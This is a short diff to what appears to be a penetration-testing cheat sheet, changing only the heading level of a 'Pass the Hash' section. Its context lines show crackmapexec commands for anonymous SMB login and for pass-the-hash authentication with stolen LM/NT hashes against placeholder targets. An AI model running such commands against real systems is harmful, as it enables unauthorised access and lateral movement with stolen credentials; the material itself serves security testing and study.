@@ -22,7 +22,7 @@
 crackmapexec smb <target(s)> -u '' -p ''
 ```
 
-# Pass the Hash
+## Pass the Hash
 ```
 crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH
 crackmapexec smb <target(s)> -u username -H NTHASH
